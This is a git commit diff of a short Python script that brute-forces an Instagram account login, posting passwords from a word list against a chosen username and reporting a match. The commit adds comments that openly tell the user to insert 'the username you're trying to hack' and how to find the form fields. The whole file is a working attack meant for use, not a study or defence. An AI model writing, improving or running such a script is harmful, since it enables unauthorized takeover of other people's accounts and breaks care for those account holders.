aed733266bdd06690c0e08f0a3f5f4c59b2bb3fa
Muhfasul Alam <40151627+muhfasul159@users.noreply.github.com>
2020-09-08 18:51:11 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,13 +1,18 @@
 import requests
 
 url = "https://www.instagram.com/accounts/login/"
-arg = open("pswd.txt", "r")
+pswd = open("pswd.txt", "r")
 
-for line in arg:
+for line in pswd:
     password = line.strip()
+    
+    # add the username you're trying to hack in "account1" field, and use inspect element to find 'username','password','submit' field/value/class.
     http = requests.post(url, data={'username': 'account1', 'password': password, 'submit': 'submit'})
     content = http.content
-    print(http.status_code)
+    
+    # To check if it's actually working, you can uncomment the following line 
+    # print(http.status_code)
+
     if b"upload" in content:
         print("Password Found: " + password)
         break
